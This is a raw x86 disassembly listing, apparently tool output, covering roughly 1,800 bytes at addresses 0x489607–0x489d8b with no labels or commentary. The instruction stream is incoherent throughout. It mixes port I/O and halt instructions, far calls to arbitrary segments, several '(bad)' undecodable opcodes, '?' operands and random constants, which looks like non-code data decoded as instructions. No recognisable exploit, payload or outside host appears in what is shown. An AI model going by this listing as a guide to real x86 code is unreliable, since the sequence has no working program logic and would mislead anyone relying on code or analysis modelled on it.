  489607:	in     al,0x57
  489609:	ins    BYTE PTR es:[edi],dx
  48960a:	add    BYTE PTR [edx-0x1b],bl
  48960d:	stc    
  48960e:	adc    BYTE PTR [eax+ebx*2+0x58b04f58],ah
  489615:	test   DWORD PTR [eax+0x3c],0xcc1dc85f
  48961c:	and    edi,eax
  48961e:	xor    BYTE PTR [esi],bh
  489620:	fild   WORD PTR [esi]
  489622:	xchg   ebp,eax
  489623:	sub    al,0xec
  489625:	repz xor eax,0x14f83df0
  48962b:	mov    WORD PTR [edi-0xe],?
  48962e:	in     al,0x13
  489630:	fcom   QWORD PTR [eax]
  489632:	pop    ecx
  489633:	adc    al,0x59
  489635:	sbb    al,0x12
  489637:	cmp    ecx,ebp
  489639:	faddp  st(2),st
  48963b:	clc    
  48963c:	mov    ecx,esi
  48963e:	adc    BYTE PTR [eax],cl
  489640:	cmp    BYTE PTR [esi],ah
  489642:	mov    ecx,0x404f2a54
  489647:	fcomp  QWORD PTR [eax+0x5c]
  48964a:	fs cmp al,0x97
  48964d:	dec    edx
  48964e:	in     eax,0xc0
  489650:	jl     0x4895d2
  489652:	mov    BYTE PTR [ebp+edx*4-0x5f56ad19],ah
  489659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48965a:	lods   al,BYTE PTR ds:[esi]
  48965b:	mov    ah,al
  48965d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48965e:	repnz pop esp
  489660:	sub    cl,al
  489662:	shl    BYTE PTR [eax-0x18],1
  489665:	add    esi,DWORD PTR [ecx-0x62]
  489668:	dec    ebx
  489669:	in     al,dx
  48966a:	hlt    
  48966b:	push   esp
  48966c:	mov    BYTE PTR [ebp+0x2a],al
  48966f:	fwait
  489670:	dec    edx
  489671:	pop    edx
  489672:	pop    edx
  489673:	(bad)  
  489674:	imul   ebx,DWORD PTR [edx-0x35],0xffffffc9
  489678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489679:	repnz xor DWORD PTR [esp+esi*8],ebp
  48967d:	dec    eax
  48967e:	dec    esp
  48967f:	cs daa 
  489681:	xchg   ebp,eax
  489682:	xchg   ebp,eax
  489683:	push   eax
  489684:	mov    edx,0x74706c6c
  489689:	mov    esp,0xfa573c9c
  48968e:	ss inc esi
  489690:	nop
  489691:	xchg   esp,eax
  489692:	cwde   
  489693:	pop    edx
  489694:	arpl   bp,sp
  489696:	sbb    ebp,DWORD PTR [edx]
  489698:	lods   eax,DWORD PTR ds:[esi]
  489699:	pushf  
  48969a:	and    DWORD PTR [eax-0xd4d8c22],esp
  4896a0:	inc    ebp
  4896a1:	pop    edx
  4896a2:	outs   dx,DWORD PTR ds:[esi]
  4896a3:	pop    edx
  4896a4:	xor    DWORD PTR [eax+edx*4-0x1a351c8f],edi
  4896ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4896ac:	fcomp  st(4)
  4896ae:	loopne 0x4896a5
  4896b0:	xor    eax,0x8ca9b946
  4896b5:	pop    esp
  4896b6:	outs   dx,BYTE PTR ds:[esi]
  4896b7:	pop    edx
  4896b8:	pop    ebx
  4896b9:	pop    ebx
  4896ba:	fwait
  4896bb:	xlat   BYTE PTR ds:[ebx]
  4896bc:	inc    edi
  4896bd:	xchg   esp,eax
  4896be:	dec    ebp
  4896bf:	gs in  al,0x5b
  4896c2:	pop    ebx
  4896c3:	pop    ebx
  4896c4:	ins    DWORD PTR es:[edi],dx
  4896c5:	hlt    
  4896c6:	push   edx
  4896c7:	pop    ecx
  4896c8:	mov    ecx,0x4c4831dc
  4896cd:	mov    esp,0xacd26832
  4896d2:	jl     0x4896cc
  4896d4:	mov    ds:0x10645a0c,eax
  4896d9:	pop    edx
  4896da:	sbb    BYTE PTR [edx+0x38],bl
  4896dd:	test   eax,0x30ae973c
  4896e2:	daa    
  4896e3:	xor    al,0x3c
  4896e5:	sbb    al,0x54
  4896e7:	sub    cl,bh
  4896e9:	out    0x52,eax
  4896eb:	pop    eax
  4896ec:	pusha  
  4896ed:	cld    
  4896ee:	mov    bh,BYTE PTR [eax+0x7c]
  4896f1:	repnz mov ah,0xf3
  4896f4:	pop    esp
  4896f5:	test   ah,ah
  4896f7:	cmp    ch,BYTE PTR [eax-0x68c35630]
  4896fd:	scas   al,BYTE PTR es:[edi]
  4896fe:	shl    BYTE PTR [ebx-0x3c],0xcc
  489702:	mov    eax,0xe7978ee4
  489707:	push   edx
  489708:	call   0x5b513bfd
  48970d:	aad    0xc8
  48970f:	div    DWORD PTR [ebx+ebx*1+0x141e120c]
  489716:	mov    BYTE PTR [ebx],dh
  489718:	sub    al,0xd3
  48971a:	into   
  48971b:	jae    0x489756
  48971d:	xor    eax,0x52603830
  489722:	push   eax
  489723:	adc    edi,esp
  489725:	mov    ecx,0x5c542ab4
  48972a:	inc    esp
  48972b:	cmp    esp,DWORD PTR [ecx+0x5b70a53b]
  489731:	or     edi,DWORD PTR ds:0x90845b78
  489737:	ss inc ebx
  489739:	rcr    BYTE PTR [ebp+0x3e],0x8c
  48973d:	pop    ebx
  48973e:	nop
  48973f:	and    eax,0x2b9e4ed7
  489744:	fistp  WORD PTR [eax+0x48379c47]
  48974a:	inc    edi
  48974b:	mov    al,0xb4
  48974d:	mov    dl,0x3b
  48974f:	jns    0x48973f
  489751:	and    eax,0xd44570fc
  489756:	fcom   DWORD PTR [ebx-0x6353cf3b]
  48975c:	in     al,0xa4
  48975e:	clc    
  48975f:	cld    
  489760:	add    al,0x5c
  489762:	or     BYTE PTR [ecx+edi*4+0x1b],bl
  489766:	pop    ecx
  489767:	stc    
  489768:	call   0x8125:0x205c1c46
  48976f:	stos   BYTE PTR es:[edi],al
  489770:	inc    esi
  489771:	dec    ecx
  489772:	gs in  eax,0xe4
  489775:	inc    eax
  489776:	inc    esp
  489777:	xor    DWORD PTR ds:0x72ee9764,0xffffffec
  48977e:	push   0x7470935c
  489783:	inc    edi
  489784:	adc    al,0x88
  489786:	xchg   ebp,eax
  489787:	retf   
  489788:	and    al,0x27
  48978a:	mov    WORD PTR [eax+ebx*4+0x272a903e],ss
  489791:	iret   
  489792:	jno    0x4897d9
  489794:	lods   al,BYTE PTR ds:[esi]
  489795:	mov    al,0x25
  489797:	pop    ebx
  489798:	jns    0x4897d8
  48979a:	xor    al,0xe9
  48979c:	je     0x4897c9
  48979e:	sub    BYTE PTR [edx*1+0x2e181f94],0x97
  4897a6:	out    0xa4,eax
  4897a8:	adc    al,0xb8
  4897aa:	mov    esp,0x9f2a61eb
  4897af:	out    dx,eax
  4897b0:	sar    BYTE PTR [edi],0xc8
  4897b3:	clc    
  4897b4:	mov    esp,ebx
  4897b6:	in     eax,0xf9
  4897b8:	dec    esi
  4897b9:	mov    eax,ds:0xec335bc8
  4897be:	fsub   QWORD PTR [eax+0x2e]
  4897c1:	int    0xee
  4897c3:	add    BYTE PTR [edi+ebx*1+0x10],bl
  4897c7:	pop    esp
  4897c8:	mov    ah,0x24
  4897ca:	bnd jl 0x489817
  4897cd:	pop    ss
  4897ce:	dec    esi
  4897cf:	pop    esp
  4897d0:	xor    eax,0xbde79434
  4897d5:	pop    edi
  4897d6:	in     eax,0x48
  4897d8:	dec    esp
  4897d9:	sub    DWORD PTR [eax+0x5c],edx
  4897dc:	sar    DWORD PTR [eax+ebx*2],cl
  4897df:	(bad)  
  4897e1:	jge    0x48977a
  4897e3:	je     0x489851
  4897e5:	xor    edi,DWORD PTR [esi+ebx*1+0x54]
  4897e9:	nop
  4897ea:	jge    0x48978c
  4897ec:	pop    edi
  4897ed:	push   edi
  4897ee:	mov    ecx,0xb8b43c3c
  4897f3:	or     DWORD PTR [ebx+esi*1-0x17916e3c],edi
  4897fa:	cmp    al,0x34
  4897fc:	fcomp  QWORD PTR [esi+ebp*2+0x46]
  489800:	sahf   
  489801:	fwait
  489802:	pop    esp
  489803:	popa   
  489804:	mov    al,BYTE PTR [ebp+0x5c]
  489807:	pop    esp
  489808:	dec    BYTE PTR [ecx+0x187cac45]
  48980e:	jns    0x48986d
  489810:	pop    ebp
  489811:	call   0xcabb:0x5d3c53c8
  489818:	inc    ebx
  489819:	mov    es,WORD PTR [eax+0x5d]
  48981c:	dec    eax
  48981d:	pop    ebp
  48981e:	dec    esp
  48981f:	inc    edi
  489820:	mov    esi,0x4e5dd252
  489825:	sub    ah,BYTE PTR [eax+0x64]
  489828:	aam    0x25
  48982a:	test   dl,cl
  48982c:	lods   eax,DWORD PTR ds:[esi]
  48982d:	mov    dl,0x72
  48982f:	mov    BYTE PTR [eax],dh
  489831:	shr    BYTE PTR [eax-0x6d9a5347],cl
  489837:	xchg   ebx,eax
  489838:	retf   0xd1a6
  48983b:	int3   
  48983c:	rcr    al,1
  48983e:	xchg   ebp,eax
  48983f:	fild   DWORD PTR [ebx+0x276edcca]
  489845:	lock inc edi
  489847:	hlt    
  489848:	lods   al,BYTE PTR ds:[esi]
  489849:	loopne 0x48986d
  48984b:	popf   
  48984c:	mov    eax,ds:0xe5ef389
  489851:	iret   
  489852:	xchg   DWORD PTR [edx-0x5b],ecx
  489855:	call   0x1e297532
  48985a:	call   0xed41f17f
  48985f:	cs cld 
  489861:	xor    eax,DWORD PTR [eax]
  489863:	pop    ebp
  489864:	add    al,0x5d
  489866:	or     al,0x5d
  489868:	cs xchg ebp,eax
  48986a:	out    0xa5,eax
  48986c:	add    BYTE PTR [eax],ah
  48986e:	pop    ebp
  48986f:	and    al,0x28
  489871:	xor    bh,cl
  489873:	out    0x64,eax
  489875:	jl     0x48985f
  489877:	mov    BYTE PTR [edi+0x1f],ch
  48987a:	push   esp
  48987b:	aam    0x6f
  48987d:	sub    BYTE PTR [esi+0x2e],bl
  489880:	push   0x70ed5d6c
  489885:	aas    
  489886:	pop    edi
  489887:	xlat   BYTE PTR ds:[ebx]
  489888:	pop    ebp
  489889:	sahf   
  48988a:	js     0x489848
  48988c:	mov    WORD PTR [ecx+0x73940990],cs
  489892:	pushf  
  489893:	sbb    eax,0xac3cb972
  489898:	mov    al,0xb4
  48989a:	mov    eax,0xf3cbbe79
  48989f:	aas    
  4898a0:	rcr    BYTE PTR [esp+edx*8+0x5584e41f],0x1a
  4898a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4898a9:	jae    0x4898a3
  4898ab:	jbe    0x48990a
  4898ad:	pop    esi
  4898ae:	gs in  eax,0xa5
  4898b1:	fnstenv [edi]
  4898b3:	or     BYTE PTR [esi+0x6c],bl
  4898b6:	sbb    al,0x5e
  4898b8:	and    BYTE PTR [esi+0x43],bl
  4898bb:	jg     0x48985b
  4898bd:	dec    ebx
  4898be:	and    al,0x2c
  4898c0:	pop    eax
  4898c1:	mov    edi,0xf240cbd0
  4898c6:	fmul   QWORD PTR [esp+edi*2-0x5fa1a10e]
  4898cd:	rol    DWORD PTR [eax+0x5e],1
  4898d0:	sub    esi,DWORD PTR [edi]
  4898d2:	xor    ebx,DWORD PTR gs:[esi-0x4e]
  4898d6:	gs and eax,0xbba6ca84
  4898dc:	push   esp
  4898dd:	dec    esi
  4898de:	sahf   
  4898df:	inc    esi
  4898e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4898e1:	test   al,0xb3
  4898e3:	enter  0xe54b,0xe4
  4898e7:	mov    ecx,0x6aa6cc72
  4898ec:	inc    ebp
  4898ed:	in     al,dx
  4898ee:	lock retf 
  4898f0:	jae    0x489956
  4898f2:	gs nop
  4898f4:	das    
  4898f5:	adc    BYTE PTR [edi+0x14],bl
  4898f8:	pop    edi
  4898f9:	pop    edx
  4898fa:	pushf  
  4898fb:	pop    esp
  4898fc:	sub    dh,BYTE PTR [edi+0xd382534]
  489902:	pop    eax
  489903:	pop    esp
  489904:	push   edi
  489905:	cmp    DWORD PTR [ecx+0x7c699fac],ebp
  48990b:	add    BYTE PTR [ebx+eiz*8],0x9e
  48990f:	pop    es
  489910:	frstor [edi+0x15]
  489913:	inc    eax
  489914:	mov    ds:0xf1480944,eax
  489919:	push   eax
  48991a:	inc    esp
  48991b:	iret   
  48991c:	ja     0x4898d7
  48991e:	pop    esp
  48991f:	fs push 0x3474376c
  489925:	dec    ebp
  489926:	js     0x489911
  489928:	mov    BYTE PTR cs:[ecx-0x74],ah
  48992c:	nop
  48992d:	pop    esi
  48992e:	dec    ebx
  48992f:	mov    dl,0xab
  489931:	pop    esp
  489932:	ficomp WORD PTR [eax-0x4f53ebc4]
  489938:	jae    0x48996f
  48993a:	mov    ah,0x5c
  48993c:	sub    dl,BYTE PTR [ebp-0xbcb4311]
  489942:	xchg   eax,edx
  489944:	aam    0xd8
  489946:	jne    0x489927
  489948:	in     eax,0xb9
  48994a:	loopne 0x489928
  48994c:	hlt    
  48994d:	aad    0xf8
  48994f:	inc    ecx
  489950:	cld    
  489951:	jbe    0x489932
  489953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489954:	stc    
  489955:	xor    eax,0x18bc5f04
  48995a:	adc    ah,BYTE PTR [ebx+0x5f20091c]
  489960:	xchg   ebp,eax
  489961:	retf   0xe9e5
  489964:	xor    ebp,DWORD PTR [eax]
  489966:	cwde   
  489967:	cmp    al,0x40
  489969:	inc    esp
  48996a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48996b:	jb     0x4899e6
  48996d:	cs dec esp
  48996f:	je     0x4899d1
  489971:	fs test eax,0x684b9e5c
  489977:	jo     0x4899cd
  489979:	test   BYTE PTR [eax+0x52e79d36],cl
  48997f:	mov    WORD PTR [esp+ebp*1+0x5d5fa02a],ss
  489986:	in     eax,0x21
  489988:	inc    edi
  489989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48998a:	pop    edi
  48998b:	lods   al,BYTE PTR ds:[esi]
  48998c:	pop    edi
  48998d:	mov    al,0x21
  48998f:	dec    ebp
  489990:	retf   
  489991:	and    al,0xb7
  489993:	psubq  mm0,mm4
  489996:	inc    edi
  489997:	enter  0x49d0,0x4e
  48999b:	cs xchg ebp,eax
  48999d:	aam    0xc
  48999f:	call   0x2be7bd90
  4899a4:	xchg   edi,eax
  4899a5:	hlt    
  4899a6:	clc    
  4899a7:	push   edi
  4899a8:	mov    ds:0x10600c44,eax
  4899ad:	pop    ecx
  4899ae:	mov    ecx,0x6c60be55
  4899b3:	xchg   esi,eax
  4899b4:	xor    BYTE PTR cs:0xdaa53334,ah
  4899bb:	sbb    eax,0x5854527b
  4899c0:	pusha  
  4899c1:	xchg   ebx,eax
  4899c2:	pusha  
  4899c3:	adc    al,0x20
  4899c5:	fs test eax,0x29545edc
  4899cb:	lods   eax,DWORD PTR ds:[esi]
  4899cc:	js     0x489a3b
  4899ce:	jl     0x4899af
  4899d0:	dec    ecx
  4899d1:	gs in  eax,0x76
  4899d4:	pushf  
  4899d5:	and    eax,0xc02dfda0
  4899da:	xchg   DWORD PTR [ebx],esp
  4899dc:	xchg   ebp,eax
  4899dd:	ffree  st(4)
  4899df:	jno    0x489a37
  4899e1:	(bad)  
  4899e2:	in     al,0x15
  4899e4:	test   al,0x41
  4899e6:	repnz stc 
  4899e8:	cs iret 
  4899ea:	mov    eax,0xdc1fcc08
  4899ef:	call   0xe6e00b7a
  4899f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4899f5:	lock add BYTE PTR [eax-0x34],ah
  4899f9:	adc    al,0x12
  4899fb:	pop    esp
  4899fc:	sahf   
  4899fd:	scas   al,BYTE PTR es:[edi]
  4899fe:	jb     0x489a28
  489a00:	pusha  
  489a01:	pusha  
  489a02:	xor    eax,0xb38b424
  489a07:	daa    
  489a08:	lock mov ebx,0x60402b3c
  489a0e:	jns    0x489a4e
  489a10:	jb     0x489a8b
  489a12:	mov    esi,0x5f5c94cb
  489a17:	ins    BYTE PTR es:[edi],dx
  489a18:	jo     0x48999a
  489a1a:	pop    ecx
  489a1b:	sbb    ebx,ecx
  489a1d:	in     eax,0x84
  489a1f:	mov    BYTE PTR [edi-0x1a346ad2],ch
  489a25:	aam    0x54
  489a27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489a28:	test   al,0xac
  489a2a:	mov    ah,0x97
  489a2c:	retf   0xf2e5
  489a2f:	xor    al,0x34
  489a31:	enter  0xd0cc,0xd8
  489a35:	mov    dl,0xbb
  489a37:	lods   al,BYTE PTR ds:[esi]
  489a38:	cmp    al,0x24
  489a3a:	cmp    eax,0xd0bece8
  489a3f:	lock mov ?,WORD PTR [esi+ebp*8-0x50]
  489a44:	xor    eax,0x900111f4
  489a49:	inc    ebp
  489a4a:	or     BYTE PTR [ecx+0xc],ah
  489a4d:	popa   
  489a4e:	arpl   WORD PTR [eax-0xe],di
  489a51:	cld    
  489a52:	and    al,0x19
  489a54:	inc    di
  489a56:	sub    al,0x30
  489a58:	popa   
  489a59:	retf   
  489a5a:	dec    esi
  489a5b:	sub    bh,BYTE PTR [ebx+0x3c6138ca]
  489a61:	inc    edi
  489a62:	retf   0x5063
  489a65:	push   esp
  489a66:	pop    ecx
  489a67:	cmp    DWORD PTR [ecx+0x64d125ec],ebp
  489a6d:	je     0x489ae7
  489a6f:	lahf   
  489a70:	addr16 dec ecx
  489a72:	gs in  eax,0x56
  489a75:	cwde   
  489a76:	mov    ecx,0xbc6b179c
  489a7b:	sbb    al,dh
  489a7d:	xor    cl,cl
  489a7f:	ror    al,0xcc
  489a82:	popa   
  489a83:	aad    0x23
  489a85:	das    
  489a86:	(bad)  [ebp-0x20]
  489a89:	inc    edi
  489a8a:	in     al,0x25
  489a8c:	lods   al,BYTE PTR ds:[esi]
  489a8d:	add    al,0x62
  489a8f:	or     BYTE PTR [edi+0x4e],dl
  489a92:	sub    bl,BYTE PTR [edi+0x2887e862]
  489a98:	sub    al,0xf7
  489a9a:	mov    al,0x47
  489a9c:	jmp    0x4c854af4
  489aa1:	idiv   ah
  489aa3:	adc    al,0x86
  489aa5:	xchg   DWORD PTR fs:[ebp+0xf],ecx
  489aa9:	or     DWORD PTR [ecx+0x14],esp
  489aac:	popa   
  489aad:	mov    eax,ds:0x7cfb6118
  489ab2:	fistp  WORD PTR [ebx]
  489ab4:	and    BYTE PTR [edx],dl
  489ab6:	add    al,0x3d
  489ab8:	xor    al,0x33
  489aba:	inc    esp
  489abb:	in     al,0x85
  489abd:	pop    ebp
  489abe:	bnd jl 0x489b1e
  489ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489ac2:	pop    eax
  489ac3:	pop    esp
  489ac4:	or     DWORD PTR [eax+0x33],esp
  489ac7:	push   0xb5482d4
  489acc:	out    0x7c,eax
  489ace:	push   ds
  489acf:	popa   
  489ad0:	nop
  489ad1:	retf   
  489ad2:	in     eax,0xf9
  489ad4:	aas    
  489ad5:	mov    esp,es
  489ad7:	mov    al,ds:0xcf2ef9a4
  489adc:	in     eax,0xa8
  489ade:	mov    al,0xb4
  489ae0:	les    ebx,FWORD PTR [edi]
  489ae2:	aam    0xbe
  489ae4:	out    dx,eax
  489ae5:	loop   0x489acc
  489ae7:	pushf  
  489ae8:	call   0xf053c44e
  489aed:	aaa    
  489aee:	clc    
  489aef:	pop    ecx
  489af0:	pop    ecx
  489af1:	jns    0x489b6c
  489af3:	test   BYTE PTR [edx+eiz*2],cl
  489af6:	adc    BYTE PTR [edx+0x14],ah
  489af9:	bound  esi,QWORD PTR [ebx]
  489afb:	int3   
  489afc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489afd:	pop    ecx
  489afe:	sbb    al,0x62
  489b00:	ins    BYTE PTR es:[edi],dx
  489b01:	xor    dl,dh
  489b03:	push   ss
  489b04:	out    0xf9,eax
  489b06:	dec    esi
  489b07:	bound  esi,QWORD PTR [ebx]
  489b09:	inc    eax
  489b0a:	push   esp
  489b0b:	and    al,0xf2
  489b0d:	fsub   QWORD PTR [ecx+0x35545ffb]
  489b13:	pop    eax
  489b14:	dec    ebx
  489b15:	es mov dl,0x47
  489b18:	jo     0x489ae4
  489b1a:	dec    ecx
  489b1b:	gs ja  0x489b92
  489b1e:	and    eax,0x9894add6
  489b23:	xchg   ebp,eax
  489b24:	xchg   ebp,eax
  489b25:	xchg   ebx,eax
  489b26:	retf   0xb1db
  489b29:	mov    eax,0xdc9f2fbc
  489b2e:	and    ebp,DWORD PTR [ebx]
  489b30:	sub    esp,DWORD PTR [edi]
  489b32:	loopne 0x489abf
  489b34:	inc    ebx
  489b35:	add    BYTE PTR [ebx+0x4],ah
  489b38:	push   esp
  489b39:	dec    esi
  489b3a:	sub    bl,BYTE PTR [edi+0x24a5ff63]
  489b40:	sub    BYTE PTR ds:0xb9395952,dl
  489b46:	dec    eax
  489b47:	dec    esp
  489b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489b4a:	ins    BYTE PTR es:[edi],dx
  489b4b:	in     eax,0xa4
  489b4d:	mov    dl,0x72
  489b4f:	jo     0x489b07
  489b51:	test   al,0x90
  489b53:	xchg   esp,eax
  489b54:	nop
  489b55:	adc    eax,0xa00c654b
  489b5a:	mov    ah,0x50
  489b5c:	pop    esp
  489b5d:	bound  esp,QWORD PTR [ebp+0x6460e5c1]
  489b63:	in     al,dx
  489b64:	inc    eax
  489b65:	js     0x489b4a
  489b67:	jl     0x489b93
  489b69:	xchg   edi,eax
  489b6a:	out    0xd8,eax
  489b6c:	cmp    BYTE PTR ds:0xa09c2c88,0xb9
  489b73:	cmp    al,0x87
  489b75:	pop    esp
  489b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489b77:	lods   al,BYTE PTR ds:[esi]
  489b78:	sbb    al,al
  489b7a:	in     eax,0x39
  489b7c:	in     al,0x52
  489b7e:	(bad)  
  489b7f:	enter  0x4d0,0x4f
  489b83:	and    DWORD PTR [ebp-0x5171b36],ebx
  489b89:	dec    ecx
  489b8a:	mov    ecx,0xf4be5418
  489b8f:	xor    al,0xe4
  489b91:	test   BYTE PTR [eax],cl
  489b93:	and    BYTE PTR es:[ebx+0x60],ah
  489b97:	mov    esi,0x8d6371f7
  489b9c:	or     al,ah
  489b9e:	aaa    
  489b9f:	sub    al,0x5e
  489ba1:	nop
  489ba2:	dec    edx
  489ba3:	mov    ch,0x66
  489ba5:	arpl   WORD PTR [ebx+0x3c],sp
  489ba8:	mov    al,ds:0x5ca9721c
  489bad:	push   eax
  489bae:	push   esp
  489baf:	pop    eax
  489bb0:	pusha  
  489bb1:	nop
  489bb2:	dec    ebx
  489bb3:	in     eax,0xf2
  489bb5:	test   BYTE PTR [eax+edi*2+0x7c],dh
  489bb9:	pop    esp
  489bba:	sub    dl,BYTE PTR [edi-0x678f7b19]
  489bc0:	pushf  
  489bc1:	mov    al,ds:0x873ce2c1
  489bc6:	test   al,0x54
  489bc8:	pusha  
  489bc9:	and    ebx,DWORD PTR [ebx]
  489bcb:	and    dl,BYTE PTR [edi-0x3fb64312]
  489bd1:	les    edi,FWORD PTR [eax+esi*1+0x4e56e9a3]
  489bd8:	sub    bl,al
  489bda:	(bad)  
  489bdc:	stos   DWORD PTR es:[edi],eax
  489bdd:	and    eax,0xf95919fc
  489be2:	cmp    al,0x0
  489be4:	fs ins DWORD PTR es:[edi],dx
  489be6:	lods   al,BYTE PTR ds:[esi]
  489be7:	and    BYTE PTR [esp-0x4e],ah
  489beb:	jb     0x489c3f
  489bed:	pop    ecx
  489bee:	lods   eax,DWORD PTR ds:[si]
  489bf0:	inc    esp
  489bf1:	dec    eax
  489bf2:	lahf   
  489bf3:	mov    al,ds:0xa4e56549
  489bf8:	push   0x8ca66e6c
  489bfd:	xchg   ebp,eax
  489bfe:	xchg   ebx,eax
  489bff:	out    0xca,eax
  489c01:	nop
  489c02:	and    BYTE PTR [esp+eax*2],bl
  489c05:	mov    al,0xb4
  489c07:	call   0x95b6f28a
  489c0c:	sbb    edx,esp
  489c0e:	jno    0x489be8
  489c10:	inc    ebx
  489c11:	scas   al,BYTE PTR es:[edi]
  489c12:	xor    eax,0x6d386504
  489c17:	test   eax,0xcdbe86dc
  489c1c:	test   eax,0x971c24f8
  489c21:	retf   0x29e5
  489c24:	repnz int3 
  489c26:	cmp    al,0xe0
  489c28:	in     al,0xe8
  489c2a:	jl     0x489c8a
  489c2c:	fisub  WORD PTR [ecx]
  489c2e:	lock cmp al,0x24
  489c31:	add    al,0x64
  489c33:	or     BYTE PTR [esp+ebx*2-0x66],ah
  489c37:	sub    DWORD PTR [esp+ecx*1+0xc641464],0x28
  489c3f:	stc    
  489c40:	sbb    al,0x72
  489c42:	test   eax,0xfc38302c
  489c47:	xor    DWORD PTR [ebx-0x38],0xffffffa5
  489c4b:	push   edx
  489c4c:	dec    esp
  489c4d:	push   eax
  489c4e:	push   esp
  489c4f:	pop    esp
  489c50:	in     al,0x5b
  489c52:	pushf  
  489c53:	retf   
  489c54:	in     al,dx
  489c55:	jo     0x489c8b
  489c57:	aas    
  489c58:	js     0x489c39
  489c5a:	retf   0x39e5
  489c5d:	or     al,0x94
  489c60:	or     eax,0xcb9c7f98
  489c65:	in     eax,0xb9
  489c67:	cmp    al,0x9
  489c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489c6a:	test   al,0xb8
  489c6c:	xchg   edi,eax
  489c6d:	retf   
  489c6e:	sti    
  489c6f:	mov    esi,0x4bc00bbc
  489c74:	enter  0x8036,0xdc
  489c78:	loopne 0x489c2c
  489c7a:	repnz pop esp
  489c7c:	cs in  al,0xec
  489c7f:	jo     0x489cbe
  489c81:	cld    
  489c82:	pop    ss
  489c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489c84:	xchg   ebp,eax
  489c85:	icebp  
  489c86:	add    BYTE PTR [ebp-0x43],ah
  489c89:	adc    dl,BYTE PTR gs:[edi+0x58bee2dd]
  489c90:	ja     0x489cb2
  489c92:	adc    cl,BYTE PTR [ebx+ecx*1+0xd]
  489c96:	sub    BYTE PTR [edx+edx*8],ch
  489c99:	loope  0x489c82
  489c9b:	jge    0x489cf4
  489c9d:	xor    al,0x42
  489c9f:	inc    eax
  489ca0:	mov    esi,0x40bbb042
  489ca5:	sub    ebx,ebp
  489ca7:	dec    edx
  489ca8:	mov    bh,0xf9
  489caa:	lods   al,BYTE PTR ds:[esi]
  489cab:	adc    eax,0x2ba26a64
  489cb0:	mov    bl,al
  489cb2:	adc    eax,0x9e5beeca
  489cb7:	dec    eax
  489cb8:	lods   al,BYTE PTR ds:[esi]
  489cb9:	adc    eax,0x14b82bd0
  489cbe:	fbstp  TBYTE PTR [edi+0x11f49538]
  489cc4:	in     al,dx
  489cc5:	shr    DWORD PTR [ebx+ecx*1-0x70],1
  489cc9:	jns    0x489c84
  489ccb:	pop    esp
  489ccc:	cs mov ah,0xd8
  489ccf:	cld    
  489cd0:	sbb    al,0x66
  489cd2:	ja     0x489cfd
  489cd4:	js     0x489c83
  489cd6:	pop    edi
  489cd7:	push   0x18
  489cd9:	or     al,0x5e
  489cdb:	sbb    al,0x4c
  489cdd:	push   eax
  489cde:	or     ebx,DWORD PTR [esi+ebp*1-0x69]
  489ce2:	retf   
  489ce3:	jo     0x489d59
  489ce5:	xchg   esp,eax
  489ce6:	cwde   
  489ce7:	mov    esp,0xb97953a9
  489cec:	loopne 0x489cf2
  489cee:	data16 sub cl,al
  489cf1:	add    esi,DWORD PTR [ecx]
  489cf3:	mov    gs,WORD PTR [ecx]
  489cf5:	aam    0x95
  489cf7:	pop    eax
  489cf8:	fdiv   DWORD PTR [edx+0x79]
  489cfb:	mov    esi,0x1f6828cb
  489d00:	jl     0x489d12
  489d02:	mov    edi,gs
  489d04:	lea    edx,[edi-0x4fff5f19]
  489d0a:	gs mov edx,0x2a54b929
  489d10:	lahf   
  489d11:	(bad)  
  489d12:	in     al,0x82
  489d14:	aam    0xdc
  489d16:	call   0xe61364f9
  489d1b:	enter  0xf8,0x66
  489d1f:	push   edi
  489d20:	or     ah,BYTE PTR [ebp+edx*8+0x29fcf3d4]
  489d27:	and    BYTE PTR [esi+0x24],ah
  489d2a:	pop    ebx
  489d2b:	and    al,0x31
  489d2d:	push   ebx
  489d2e:	fistp  WORD PTR [ebx]
  489d30:	lods   al,BYTE PTR ds:[esi]
  489d31:	jp     0x489cdb
  489d33:	mov    DWORD PTR [eax],0xc9b6018e
  489d39:	add    dl,BYTE PTR [ebx-0x1f]
  489d3c:	cwde   
  489d3d:	xor    bl,BYTE PTR [esi]
  489d3f:	sti    
  489d40:	dec    eax
  489d41:	or     dh,BYTE PTR [eax+0x2bb94cd2]
  489d47:	aas    
  489d48:	fwait
  489d49:	idiv   BYTE PTR [edi-0x20]
  489d4c:	aas    
  489d4d:	sbb    al,0x33
  489d4f:	leave  
  489d50:	push   esi
  489d51:	mov    esi,DWORD PTR [edx+0x4]
  489d54:	mov    DWORD PTR [ebp-0x18],ecx
  489d57:	add    al,0xec
  489d59:	lock mov edi,ebp
  489d5c:	push   edi
  489d5d:	pop    edx
  489d5e:	outs   dx,DWORD PTR ds:[esi]
  489d5f:	mov    al,BYTE PTR [ebp-0x1c]
  489d62:	mov    BYTE PTR [eax-0x7471f3d4],al
  489d68:	xor    DWORD PTR [edi],ecx
  489d6a:	mov    edi,0x9570a49
  489d6f:	sub    al,0x16
  489d71:	mov    al,0x2a
  489d73:	hlt    
  489d74:	(bad)  
  489d75:	loop   0x489dc9
  489d77:	push   ebx
  489d78:	fcomp  DWORD PTR [esp+eiz*2-0x57]
  489d7c:	cli    
  489d7d:	mov    dh,0x7d
  489d7f:	mov    WORD PTR [ebp-0x4d46f589],es
  489d85:	push   esi
  489d86:	or     DWORD PTR [ebp+ecx*4-0x45],ebp
  489d8a:	pusha  
  489d8b:	push   edi
